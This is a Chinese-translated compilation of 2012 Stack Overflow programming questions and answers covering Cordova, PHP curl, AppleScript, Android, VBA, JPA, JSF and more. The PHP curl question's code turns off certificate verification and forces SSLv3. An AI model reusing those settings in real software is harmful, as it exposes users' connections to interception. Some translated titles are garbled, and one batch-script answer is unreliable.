我们刚刚在 iOS 上升级到 PhoneGap/Cordova 2.0，但我们在 JSONKit.m 中看到了多个警告。

有两类警告：（1）“格式字符串问题”和（2）“语义问题”。

这是“格式字符串问题”的示例：

```
/Users/macuser/Documents/CordovaLib/Classes/JSON/JSONKit.m:745:180: Format specifies type 'unsigned long' but the argument has type 'NSUInteger' (aka 'unsigned int') 
```

这是“语义问题”的示例：

```
/Users/macuser/Documents/CordovaLib/Classes/JSON/JSONKit.m:2600:11: Direct access to objective-c's isa is deprecated in favor of object_setClass() and object_getClass() 
```

我们在 Lion，Xcode 4.4。

任何线索为什么现在会发生这种警告而以前没有？

谢谢！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-31T19:27:10.750

来自 Google 网上论坛的用户：

Xcode 4.4 使用更严格的更新编译器。它是无害的（目前），但此问题已修复：[https ://issues.apache.org/jira/browse/CB-1164](https://issues.apache.org/jira/browse/CB-1164)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-09T09:33:54.277

在这里您可以找到如何删除警告： [https ://github.com/johnezang/JSONKit/issues/79](https://github.com/johnezang/JSONKit/issues/79)

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-12-28T12:07:51.200

这是没有 xcode 4.4 警告的[JSONKit文件](https://github.com/IgorFedorchuk/JSONKitWithoutXcode4Warnings)

# php - '释放对象的校验和不正确' libcurl 在 osx 上使用 https

> ID：11735465
> 
> 赞同：2
> 
> 时间：2012-07-31T07:48:53.900
> 
> 标签：php, curl, https, libcurl

当我尝试在 https url 上执行 curl 命令时，我不断收到“释放对象的校验和不正确”错误。这仅发生在我的 osx 开发人员机器上，当我在 ubuntu 服务器上执行相同的代码时，它不会发生。我还在其他 osx 设置上尝试过它，它在每台机器上都给出了相同的错误。

我正在运行 Mac OSX 10.7.4，并通过[http://php-osx.liip.ch/安装了 php 5.4](http://php-osx.liip.ch/)

这是我在控制台中遇到的错误的一部分：

```
Parent Process:  httpd [2228]

PlugIn Path:       /usr/local/php5/lib/libcurl.4.dylib
PlugIn Identifier: libcurl.4.dylib
PlugIn Version:    7.0.0 (compatibility 7.0.0)

Date/Time:       2012-07-31 09:30:50.602 +0200
OS Version:      Mac OS X 10.7.4 (11E53)
Report Version:  9

Crashed Thread:  0  Dispatch queue: com.apple.main-thread

Exception Type:  EXC_CRASH (SIGABRT)
Exception Codes: 0x0000000000000000, 0x0000000000000000

Application Specific Information:
*** error for object 0x7fd15c8274f8: incorrect checksum for freed object - 
    object was probably modified after being freed. 
```

导致此错误的代码如下：

```
function __doRequest($request, $location, $action, $version, $one_way = null)
{
    stream_wrapper_unregister('https');
    stream_wrapper_unregister('http');
    stream_wrapper_register('https', '<namespace>\\streamWrapperHttpAuth');
    stream_wrapper_register('http', '<namespace>\\streamWrapperHttpAuth');

    $headers = array(
        'User-Agent: PHP-SOAP', 'Content-Type: text/xml;charset=UTF-8', 
        'SOAPAction: "' . $action . '"', 
        'Content-Length: ' . strlen($request), 'Expect: 100-continue', 
        'Connection: Keep-Alive'
    );

    $this->__last_request_headers = $headers;
    $ch                           = curl_init($location);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    curl_setopt($ch, CURLOPT_POST, TRUE);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $request);

    curl_setopt($ch, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_1);
    curl_setopt($ch, CURLOPT_FAILONERROR, FALSE);
    curl_setopt($ch, CURLOPT_HTTPAUTH, CURLAUTH_NTLM);

    curl_setopt($ch, CURLOPT_USERPWD, $this->Username . ':' . $this->Password);
    curl_setopt($ch, CURLOPT_SSLVERSION, 3);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);

    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    //curl_setopt($ch, CURLOPT_VERBOSE, TRUE);
    curl_setopt($ch, CURLOPT_CERTINFO, TRUE);

    $response = curl_exec($ch);

    if (($info = curl_getinfo($ch)) && $info['http_code'] == 200) {
        return $response;
    }
    else if ($info['http_code'] == 401) {
        throw new \Exception ('Access Denied', 401);
    }
    else if (curl_errno($ch) != 0) {
        throw new \Exception(curl_error($ch) . curl_errno($ch) . 
            $location, curl_errno($ch));
    }
    else {
        //throw new \Exception($response, $info['http_code']);
        return $response;
    }

    stream_wrapper_restore('https');
    stream_wrapper_restore('http');
} 
```

错误在以下行中引发：'$response = curl_exec($ch);'，当通过 http 而不是 https 调用 web 服务时它起作用了。

# c++ - 为 FBX 文件中的每个骨骼添加新的关键帧（c++）

> ID：11735467
> 
> 赞同：2
> 
> 时间：2012-07-31T07:48:59.780
> 
> 标签：c++, animation, fbx

我是 FBX SDK 的新手。我正在使用版本 2013.2 。我目前正在从文件中导入 FbxScene。我想做的是为场景中的每个骨骼添加新的平移、旋转和缩放关键帧。请帮助我。谢谢。

# performance - Windows Server 2008 R2 中缺少性能计数器

> ID：11735470
> 
> 赞同：0
> 
> 时间：2012-07-31T07:49:25.817
> 
> 标签：performance

性能监视器中缺少用户定义的性能计数器，但注册表中存在性能条目，其中包含 Dll 和打开、收集和关闭功能等所有信息。我尝试了 lodctr /r 并且 exctrlst.exe 也显示我的计数器已启用。

任何帮助将不胜感激

提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-13T18:20:25.017

可能与您的程序运行的 Windows 帐户有关。我有一个类似的问题，如果我在 LocalSystem 帐户中运行我的程序，windows perfmon 可以显示我的自定义计数器，而如果我在另一个帐户中运行它，则不会显示它们。

# google-chrome - Apple脚本在chrome上打开网页并复制文本

> ID：11735471
> 
> 赞同：2
> 
> 时间：2012-07-31T07:49:33.717
> 
> 标签：google-chrome, applescript

好吧，这是我的问题，我试图在 AppleScript 中编写代码以打开网页并复制所有文本，然后将其保存到变量中，稍后再使用该变量，问题是我已经为 safari 和它运作良好，但对于 chrome，我不知道该怎么做，我今天盯着学习这种语言，所以任何帮助将不胜感激。这是我到目前为止所拥有的

```
 tell application "Google Chrome"
activate
set theurl to "http://www.webpage.com"
if (count every window) = 0 then
    make new window
end if

set found to false
set theTabIndex to -1
repeat with theWindow in every window
    set theTabIndex to 0
    repeat with theTab in every tab of theWindow
        set theTabIndex to theTabIndex + 1
        if theTab's URL = theurl then
            set found to true
            exit repeat
        end if
    end repeat

    if found then
        exit repeat
    end if
end repeat

if found then
    tell theTab to reload
    set theWindow's active tab index to theTabIndex
    set index of theWindow to 1
else
    tell window 1 to make new tab with properties {URL:theurl}
end if
    end tell

    tell application "Google Chrome"
tell tab 6 of window 1 to select all
tell tab 6 of window 1 to copy selection
--in here I dont know how to set the variable with the text i just copied 
    end tell 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-31T08:11:56.477

您可以使用`the clipboard as text`.

```
tell application "Google Chrome" to tell tab 1 of window 1
    select all
    copy selection
end tell

set t to the clipboard as text 
```

您还可以使用`document.body.innerText`：

```
tell application "Google Chrome" to tell tab 1 of window 1
    set t to execute javascript "document.body.innerText"
end tell 
```

# c++ - 当通过名称引用时，名称存储在哪里？

> ID：11735481
> 
> 赞同：2
> 
> 时间：2012-07-31T07:50:02.270
> 
> 标签：c++, c, variables

例如，在我们定义了一个变量之后：

```
int a=2; 
```

之后我们可以使用“a”作为 2。
在我第一次学习 c/c++ 的时候，我认为它是理所当然的。
但是当我了解了“指针”的概念和变量的地址之后，我就一头雾水了。

如果`int* p=&i;`，其中“i”是一个 int。我知道 p 有 i 的地址，所以我们可以使用 *p 来获取 i 的值。但是如果我们更进一步，“p”是如何访问的呢？似乎 p 必须按名称引用，对吗？

现在，通过地址访问变量对我来说似乎更自然，也更容易理解。
但是现在，当使用最简单的方法访问变量时，我对机制感到困惑。
与 的情况一样`int a=2;`，名称“a”存储在哪里？

为什么如果我们使用“a”，它就相当于访问存储“a”或“2”的内存的行为？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-07-31T07:55:39.237

这里`a`只是一个象征性的名字。如果它是一个局部变量，它就不会存储在任何地方。编译器只是在编译阶段使用它，引用实际值（可以在堆栈上或寄存器中），然后丢弃。

If you looked at the assembly generated by compiler, you'd notice that `a` isn't appearing there (or maybe in comments). Compiler will fit your variable somewhere, and just use that location afterwards (like the `eax` register on x86).

If you looked at an LLVM assembly (which is quite interesting), you'd notice that the compiler just treats your variables as `@1`, `@2`, `@3`...

On the other hand, if `a` would be a global variable (and a non-`static` one), the name would actually be used in the symbol table to reference the variable. But it'd be the other way around — variable would be placed somewhere without the name, and the symbol table would map that name to the location so that other programs could find it.

* * *

As a side note: if the program is compiled with debug data, the name `a` is stored there so that the debugger could display it to help you understanding what's happening.

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-07-31T07:54:34.593

这称为抽象。`a`故意未指定存储方式和存储位置。编译器会为你处理好它。

实际上，如果`a`是函数内部的局部变量，它将在调用时存储在该函数的堆栈帧中。堆栈帧的布局在编译时确定，之后不会改变。实际上，编译器将为`a`（相对于堆栈帧的开始）生成一个相对地址，该地址将在函数实际执行时转换为绝对地址，以及堆栈帧的起始地址是已知的。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-07-31T07:54:52.340

在编译和链接过程之后，所有像“a”和“p”这样的符号都将转换为地址。这些符号仅用于按名称使用它们的功能。它就像内存地址的标签。即使“p”持有“a”的地址，指针“p”也被编译器更改为地址。

# java - SWT 小部件的 HTML“getElementByID”实现

> ID：11735485
> 
> 赞同：0
> 
> 时间：2012-07-31T07:50:16.483
> 
> 标签：java, swt

在 HTML 中，有类似的东西`document.getElementById("button1");`

我希望在我的 SWT 应用程序中发生这种事情。

假设我在运行时创建了一个 SWT 小部件，`new Button(shell, SWT.PUSH)` 我可以在任何地方获取（引用）这个对象，类似于`getElementById(...)`？

我正在考虑创建一个`HashMap<String, Object>`类型，其中 String 放置对象（Widget）的 id，然后我将调用`hashMap.getKey(id)`它将返回对对象（Widget）的引用。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-31T13:11:26.437

有几种可能性来实现这样的功能，而无需付出任何巨大的努力。作为示例实现，您可以使用 SWTBot（SWT 的 GUI 测试 API），它有多种方法可以通过给定的 id “查找”小部件。

下载 SWTBot 源代码（参见[http://wiki.eclipse.org/SWTBot/Contributing#Getting_the_source](http://wiki.eclipse.org/SWTBot/Contributing#Getting_the_source)）并查看示例，`org.eclipse.swtbot.swt.finder.SWTBot.buttonWithId(String, String, int)`如果您浏览实现，您将了解如何实现。 .

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-31T10:31:20.500

不，SWT 小部件没有 id 或类似的东西。当然，正如您所说，您可以使用地图手动完成。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-31T13:43:50.740

您可以使用类似这样的方法递归检查组合的所有子项，并使用[Widget.getData()/setData()](http://help.eclipse.org/indigo/index.jsp?topic=/org.eclipse.platform.doc.isv/reference/api/org/eclipse/swt/widgets/Widget.html)设置一个 id：

```
public <T extends Control> T findChild(Composite parent, String id) {
    Control found = null;
    Control[] children = parent.getChildren();
    for (int i = 0; i < children .length && found == null; i++) {
        Control child = children[i];
        if (id.equals(child.getData(ID)) {
            found = child;
        } else if (child instanceof Composite) {
            found = findChild((Composite) child, id);
        }
    }
    return (T) found ;
} 
```

# java - Liferay 6.1中通过元数据查询DLFileEntry

> ID：11735487
> 
> 赞同：1
> 
> 时间：2012-07-31T07:50:18.910
> 
> 标签：java, metadata, liferay-6

在 Liferay 6.1 中，您可以将自定义元数据字段附加到您的 DLFileEntries。如何通过 Java API 中的元数据内容查询 DLFileEntries？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-31T09:58:17.793

`DLFileEntry`参见和 之间的关系`DLFileEntryMetadata`：

![在此处输入图像描述](../Images/432fba65a1d03cf6cb03a61f9b79f376.png)

来自 /liferay-sources/portal-impl/classes/com/liferay/portlet/documentlibrary/service.xml

你用动态查询得到猫`DLFileEntryMetadata`，然后把它映射`DLFileEntriy`到`dLFileEntryMetadata.getFileEntryId()`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-10T14:20:59.290

[您可以使用Expando 机制](http://www.liferay.com/web/raymond.auge/blog/-/blogs/715049)扩展任何 Liferay 域对象。不同的 Expando 服务使您能够在任何对象（包括 DFFileEntry）上定义附加字段，而无需求助于 DynamicQuery 功能。

# android-layout - ListActivity 底部按钮

> ID：11735490
> 
> 赞同：2
> 
> 时间：2012-07-31T07:50:36.957
> 
> 标签：android-layout

嗨，我创建了一个 listActivity，其中包含一些数据行，并在屏幕底部（不是列表）放置了一个按钮。我的问题是，如果我的列表已满，因此需要滚动为了让其他行可以看到，按钮似乎是透明的，并且与列表的最后一个元素重叠。所以看起来并不令人愉快。你对如何解决这个问题有什么建议吗？有吗有什么方法可以让我的列表为底部按钮留出一些空间？我不想用页脚视图来实现它。我会发布 xml 文件，以便您有更清晰的图片。

```
<?xml version="1.0" encoding="utf-8"?>
<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="fill_parent"
    android:layout_height="fill_parent" >

  <DragNDrop.DragNDropListView
      android:id="@+id/android:list"
      android:layout_width="fill_parent"
      android:layout_height="fill_parent"
      android:layout_alignParentLeft="true"
      android:layout_alignParentTop="true"
      android:layout_weight="1" >
  </DragNDrop.DragNDropListView>

  <Button
      android:id="@+id/btn"
      android:layout_width="wrap_content"
      android:layout_height="wrap_content"
      android:layout_alignParentBottom="true"
      android:layout_centerHorizontal="true"
      android:alpha="1"
      android:drawableLeft="@drawable/back"
      android:text="Return" />

</RelativeLayout> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-31T07:56:01.263

试试这个

```
 <?xml version="1.0" encoding="utf-8"?>
<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="fill_parent"
    android:layout_height="fill_parent" >

  <Button
      android:id="@+id/btn"
      android:layout_width="wrap_content"
      android:layout_height="wrap_content"
      android:layout_alignParentBottom="true"
      android:layout_centerHorizontal="true"
      android:alpha="1"
      android:drawableLeft="@drawable/back"
      android:text="Return" />

  <DragNDrop.DragNDropListView
      android:id="@+id/android:list"
      android:layout_width="fill_parent"
      android:layout_height="fill_parent"
      android:layout_above="@id/btn" >
  </DragNDrop.DragNDropListView>

</RelativeLayout> 
```

在RelativeLayout中，元素默认放在左上角，List不需要指定

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-31T07:53:12.903

最简单的方法是在 ListView 下方使用`LinearLayout`with`orientation = vertical`和`ListView`with和 Button。`layout_weight = 1`

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-31T07:55:14.993

先把按钮放在相对布局中再设置属性

```
android:layout_above="@id/btn" 
```

列出视图。所以最后一个元素不会被按钮发现，因为列表的高度是最大高度减去按钮高度。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-07-31T07:59:38.093

如下所示更改您的 xml

```
<?xml version="1.0" encoding="utf-8"?>
<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
android:layout_width="fill_parent"
android:layout_height="fill_parent" >

<DragNDrop.DragNDropListView
  android:id="@+id/android:list"
  android:layout_width="fill_parent"
  android:layout_height="fill_parent"
  android:layout_alignParentLeft="true"
  android:layout_alignParentTop="true"
  android:layout_above="@id/btn"
  android:layout_marginBottom="50dp"
  android:layout_weight="1" >
 </DragNDrop.DragNDropListView>

<Button
  android:id="@+id/btn"
  android:layout_width="wrap_content"
  android:layout_height="wrap_content"
  android:layout_alignParentBottom="true"
  android:layout_centerHorizontal="true"
  android:alpha="1"
  android:drawableLeft="@drawable/back"
  android:text="Return" />

</RelativeLayout> 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-07-31T08:05:27.543

试试这个，这样你将有 10% 用于整个视图中的按钮，90% 用于列表视图，并且按钮不会与最后一个列表元素重叠。

```
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
 android:layout_width="fill_parent"
 android:layout_height="fill_parent"
 android:orientation="vertical"
 android:weightSum="100" >

 <ListView
  android:id="@+id/android:list"
  android:layout_width="match_parent"
  android:layout_height="0dp"
  android:layout_weight="90" >
</ListView>

<Button
  android:id="@+id/btn"
  android:layout_width="wrap_content"
  android:layout_height="0dp"
  android:layout_weight="10"
  android:text="Return" />

</LinearLayout> 
```

# latex - 每个部分之后的 LaTeX 目录

> ID：11735496
> 
> 赞同：0
> 
> 时间：2012-07-31T07:51:02.410
> 
> 标签：latex

如何在章节开始后添加目录？

见[硕士论文](http://diuf.unifr.ch/people/fuhrer/studproj/rohrer/download/GraphicalAspectModelEditor_GAME.pdf)，第 1 页。

顺便说一句，有谁知道这是什么 LaTeX 文档类/样式？！看起来真的很不错。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-31T08:02:20.603

我相信*minitoc*包可以满足您的要求： [http ://www.ctex.org/documents/packages/contents/minitoc.pdf](http://www.ctex.org/documents/packages/contents/minitoc.pdf)

# vba - 您对事件处理的帮助

> ID：11735499
> 
> 赞同：0
> 
> 时间：2012-07-31T07:51:12.780
> 
> 标签：vba, excel

我正在学习 vba 的事件处理。这是我的第一次尝试。

```
'in sheet Object
Dim WithEvents engine As MCengine

Private Sub engine_OnEachTrial(ByVal i As Integer)
progressBar = Application.Floor(i * 30 / engine.numOfPaths, 0.001)

With ActiveSheet.Range("E10").Characters(start:=0, Length:=progressBar).Font
    .Name = "Calibri"
    .FontStyle = "Bold"
    .Size = 11
    .ColorIndex = 16
End With
End Sub

Private Sub Worksheet_Activate()

Dim btn As Button
Dim rng As Range
Set engine = New MCengine
With ActiveSheet
Set rng = .Range("E9")
Set btn = .Buttons.Add(rng.Left, rng.Top, rng.Width, rng.Height)
    With btn
    .Caption = "Run MC simulation"
    .OnAction = "runMC"
    End With
End With

End Sub

Sub runMC()

engine.process = 1
engine.numOfPaths = 30
engine.start

End Sub 
```

上面代码的问题是onAction注册的子过程不能被调用，因为看起来runMC必须在Module中。我无法将这些代码移动到模块，因为`Dim WithEvents engine As MCengine`需要在工作表对象中声明。所以我被困在中间。我应该使用其他按钮回调方法吗？

这是否意味着我不能在模块中使用带有事件的类？任何人都可以启发我吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-31T08:28:14.213

我假设您希望此代码适用于整个工作簿，这就是您使用“Activesheet”的原因？
如果是这样，您需要将代码粘贴到 Thisworkbook 模块中。

```
Option Explicit

Private Sub Workbook_SheetActivate(ByVal oSheet As Object)
    Dim btn As Button
    Dim rng As Range

    'Set engine = New MCengine
    With oSheet
        Set rng = .Range("E9")
        Set btn = .Buttons.Add(rng.Left, rng.Top, rng.Width, rng.Height)
        With btn
            .Caption = "Run MC simulation"
            .OnAction = "Thisworkbook.Test_btn"
        End With
    End With
End Sub

Sub Test_btn()

MsgBox "Ok"

End Sub 
```

如果没有，您可以将其粘贴到常规工作表模块和工作表事件中：
private sub Worksheet_Activate，但请注意在以下位置定义正确的工作表对象：

```
.OnAction = "Sheet1.Test_btn" 
```

# java - 对象类型的 JPA 映射注释

> ID：11735501
> 
> 赞同：1
> 
> 时间：2012-07-31T07:51:14.373
> 
> 标签：java, hibernate, jpa, annotations, jpa-2.0

我将实现一个实体类，例如：

```
@Entity
public class XXXEntity {
     @Id
     private Long id;

     private Object entity;
} 
```

但我不确定如何映射对象类型字段？

实际上，在我的项目中，对象类型包含其他几个实体，例如 A、B、C。（所有 A、B 和 C 都实现 Serilizable 接口）

我想将它注释为@Lob，但我不确定它是否正确？因为 Object 没有实现 Serilizable 接口。

有什么想法吗？谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-31T07:55:55.410

No, it is not correct to annotate it with @Lob. You cannot directly annotate arbitrary Object as a persistent attribute. JPA provider have no way to know how to persist it.

According JPA 2.0 specification persistent attribute must be one of following:

> Java primitive types; java.lang.String; other Java serializable types (including wrappers of the primitive types, java.math.BigInteger,java.math.BigDecimal,java.util.Date,java.util.Calendar[5], java.sql.Date, java.sql.Time, java.sql.Timestamp, byte[], Byte[], char[], Character[], and user-defined types that implement the Serializable interface); enums; entity types; collections of entity types; embeddable classes; collections of basic and embeddable types.

You should redesign model such a way that there is no need to persist basically typeless data.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-03T01:26:30.570

您应该决定 A、B 和 C 是实体还是状态字段值。如果它们是实体并且它们可以被引用、通过它们的属性查询，则创建一个通用的超类来继承。

如果它们只是一个对象，那么使用 Lob 并实现 Serializable 就足够了。如果 JPA 提供程序要求您将 Object 替换为其他内容，如您所说，您可以使用 Serializable 接口，如果这不起作用，则使用实现 Serializable 的通用超类。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-31T08:05:00.400

您不能将 Object 字段注释为 @Lob。根据规范：“Lob 可以是二进制或字符类型。”

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-03T01:40:36.067

在我看来，您想将其用作“ValueObject”（正如您提到的可序列化）而不是“Entity”。

如果将字段视为 ValueObject 就可以了。使用 Lob 应该没问题（您总是可以通过手动序列化找到解决方法）。

但是，如果您想将它们视为“实体”，则将其声明为“对象”的引用是不合理的。最明显的论点之一是对象不是实体，因为它不包含任何实体身份。

# jquery - 如何在jquery mobile中将动态数据从page1传递到page2

> ID：11735504
> 
> 赞同：1
> 
> 时间：2012-07-31T07:51:20.583
> 
> 标签：jquery, jquery-mobile

我在 Jquery mobile 中有两个页面（page1.html、page2.html、page1.js、page2.js）。带有动态列表的表单在 page1 中可用。我想提交这个表单，然后这个表单数据传递到page2并显示在page2中。那么如何使用jquery mobile将“page1”表单数据传递给“page2”。page1表单也包含动态列表，那么如何在page2中获取动态列表参数。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-31T09:17:32.140

相信`$.mobile.loadPage`会对你有所帮助。

虽然你必须使用 PHP。

```
$.mobile.loadPage( "page2.php", {
    type: "post",
    data: $("form#form_id").serialize();
}); 
```

然后在 page2.php 你应该看到数据

```
<?php
  print_r($_POST);
?> 
```

如果您不能使用 PHP，那么我相信您可以使用上面相同的脚本，但使用 Js 来提取 GET 参数。我不喜欢。

# sql - 排除以数字开头的文件 - 批处理脚本

> ID：11735505
> 
> 赞同：0
> 
> 时间：2012-07-31T07:51:26.183
> 
> 标签：sql, batch-file

如何从循环中排除文件->如果目录中的文件名以数字开头。

```
for %%G in (*.sql) do sqlcmd -S %SName% -U %UName% -P %Pwd% -d %DbName% -Q "EXECUTE sp_deploy %%~nG" >> "C:\%%~nG.sql" 2>&1 
```

如果文件名以数字开头，我不想执行 sql。我怎么能阻止它..

提前致谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-31T07:52:51.333

```
"if '%%~nG' not like '[0-9]%' EXECUTE sp_deploy %%~nG" 
```

# asp.net - Gridviews/Tables 分页。发布、获取或 AJAX？

> ID：11735509
> 
> 赞同：0
> 
> 时间：2012-07-31T07:51:32.567
> 
> 标签：asp.net, html, design-patterns, gridview

我在 ASP.NET 项目中构建自己的 GridView

我正在制定我的计划，我想知道对于一个简单的问题、分页和排序，最好的解决方案是什么。

1.  快速简便的方法是使用提交按钮（或类似按钮）并将表单发回。这也是 ASP.NET gridview 的工作方式。

    亲：

    *   更少的开销

    缺点：

    *   后退按钮
2.  第二种方法是使用链接和带有 GET 请求的 URL。

    亲：

    *   后退按钮工作得很好
    *   直接链接到某个位置

    缺点：

    *   由于对 url 的依赖，可重用性较低
3.  第三种方法是AJAX

    亲：

    *   小开销

    缺点：

    *   更难实施

你会选择什么设计/解决方案，为什么？

我是否忽略了一些优点和缺点？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-31T08:05:27.713

我添加了一些额外的评论来思考。

**- 第二种方法是使用链接和带有 GET 请求的 URL。**
如果您需要网络蜘蛛 (google) 知道您网站的所有页面，并且对 SEO 友好，这是您需要使用的。这种方法的问题是你不能有视图状态，每次你必须渲染你在 url 参数上看到的页面而不知道其他任何东西。

在这种情况下，如果您希望在一行上进行编辑，您可能会遇到更多问题

**- 快速简便的方法是使用提交按钮（或类似按钮）并将表单发回**
如果您在代码后面拥有许多功能，这是一种方法，因为通过回发，您已经完成了所有先前的操作，并且视图状态正在工作，可以用于此目的。对 SEO 不友好，如果你想做到这一点，你需要额外的代码才能在 url 上写下你现在需要登陆的页面。

**-第三种方法是AJAX** ，这是一种必须与前一种方法共存的方法，而不是单独的方法，以防浏览器因任何原因无法运行javascript。如果您不关心这一点，剩下的就是这种方法也不是 SEO 友好的，您需要制作它，它很酷，很现代，并且是现代网站的必需品，但是如果您要做困难的事情，那么您可能会最终导致许多必须解决的问题。

总结一下：

```
More than show data ? Post Request : Get Request  ; // ToDo: make it ajax 
```

# android - Android - 设置警报问题

> ID：11735513
> 
> 赞同：0
> 
> 时间：2012-07-31T07:51:45.167
> 
> 标签：android, calendar, alarm

嗨，我正在通过推送创建警报，所以当我收到通知时，我设置了警报。一切正常，但警报显示在我推动的那一刻，而不是我说的那一刻。

这是我的代码：

```
public void set_alarm(int year, int month, int day, int hour, int minute,
        String title) {

    Calendar cal = Calendar.getInstance();
    cal.set(Calendar.MONTH, 5);
    cal.set(Calendar.YEAR, 2012);
    cal.set(Calendar.DAY_OF_MONTH, 31);
    cal.set(Calendar.HOUR_OF_DAY, 9);
    cal.set(Calendar.MINUTE, 46);

    Intent intent = new Intent(c, AlarmActivity.class);
    intent.putExtra("title", title);
    PendingIntent pendingIntent = PendingIntent.getBroadcast(
            c.getApplicationContext(), 1253, intent,
            PendingIntent.FLAG_UPDATE_CURRENT | Intent.FILL_IN_DATA);

    AlarmManager alarmManager = (AlarmManager) c
            .getSystemService(c.ALARM_SERVICE);

    alarmManager.set(AlarmManager.RTC_WAKEUP, cal.getTimeInMillis(),
            pendingIntent);
} 
```

这是接收通知的类：

```
public class AlarmActivity extends BroadcastReceiver {

@Override
public void onReceive(Context c, Intent i) {
    Toast.makeText(c, "Alarm worked.", Toast.LENGTH_LONG).show();

    int icon = R.drawable.ic_dialog_alert;
    long when = System.currentTimeMillis();

    Bundle bundle = i.getExtras();
    String title = bundle.getString("title");

    final int NOTIF_ID = 1234;
    NotificationManager notofManager = (NotificationManager) c
            .getSystemService(Context.NOTIFICATION_SERVICE);

    Intent notificationIntent = new Intent(c, AnonymeActivity.class);
    PendingIntent contentIntent = PendingIntent.getActivity(c, 0,
            notificationIntent, 0);
    Notification notification = new Notification(icon, "Faraway", when);

    notification.setLatestEventInfo(c, "Faraway alarm", title,
            contentIntent);

    notification.flags = Notification.FLAG_INSISTENT;
    notification.defaults |= Notification.DEFAULT_SOUND;

    notofManager.notify(NOTIF_ID, notification);
} 
```

}

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-31T08:00:00.663

您正在创建一个日历实例，日期为 2012 年 5 月 31 日，该日期早于当前日期。

根据文档：

> 如果时间发生在过去，将立即触发警报。

只需设置正确的日期和时间。实际上，您应该使用传递给 set_alarm() 函数的参数。

（来源： http: [//developer.android.com/reference/android/app/AlarmManager.html#set(int, long, android.app.PendingIntent](http://developer.android.com/reference/android/app/AlarmManager.html#set%28int,%20long,%20android.app.PendingIntent%29) )

# java - 如何将数据库结果集加载到 jeditorpane

> ID：11735516
> 
> 赞同：0
> 
> 时间：2012-07-31T07:52:02.933
> 
> 标签：java, mysql, swing, resultset, jeditorpane

如何将数据库结果集加载到`jeditorpane`. 插入结果集后，是否可以更改对齐方式？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-31T11:40:31.447

您可以[在](http://docs.oracle.com/javase/tutorial/uiswing/components/html.html)`JEditorPane`. 如果将您`ResultSet`的转换为 HTML `<table>`，则可以这样对齐。

# java - 和 不能一起工作？

> ID：11735525
> 
> 赞同：0
> 
> 时间：2012-07-31T07:52:37.637
> 
> 标签：java, jsp, jstl

你好我有一个这样的jsp页面

```
<%@ page language="java" contentType="text/html; charset=ISO-8859-1"
    pageEncoding="ISO-8859-1"%>
<%@ taglib prefix="f" uri="http://java.sun.com/jsf/core"%>
<%@ taglib prefix="h" uri="http://java.sun.com/jsf/html"%>
<%@ taglib prefix="c" uri="http://java.sun.com/jsp/jstl/core"%>

<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
<title>Compact Output</title>
</head>
<body>
  <f:view>
    <h:form>
      <c:forEach items="${bean.itemlist}" var="item">
        <h:panelGrid columns="1" id="panel1">
      <h2><c:out value="${item.displayName}" /></h2>
          <img src="<c:out value="${item.thumbnailURI}"/>" height="600" width="800" />    
          <h:commandLink action="#{bean.action1}" value="Details">
            <f:param name="selecteddisplayName"  value="#{item.displayName}" />
          </h:commandLink>
        </h:panelGrid>
      </c:forEach>
    </h:form>
</f:view>
</body>
</html> 
```

我放

```
 <h:commandLink action="#{bean.action1}" value="Details">
            <f:param name="selecteddisplayName"  value="#{item.displayName}" />
          </h:commandLink> 
```

在标签内，但是当点击链接时，#{bean.action1} 被调用，但参数 item.displayName 没有传递给控制器​​。我试图将其更改为 ${item.displayName} 然后我得到编译错误“值”不支持运行时表达式。

我的jsp页面有什么问题？

在我的控制器中，我定义了私有字符串 selecteddisplayName 和 getter/setter。

也许不能一起工作？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-31T08:36:34.407

如果你想在属性中设置值

尝试 `<f:setPropertyActionListener value="" target=""/>` 代替 `<f:param name="selecteddisplayName" value="#{item.displayName}" />`

# java - 基于tomcat servlet上下文定义的spring加载application.properties

> ID：11735526
> 
> 赞同：5
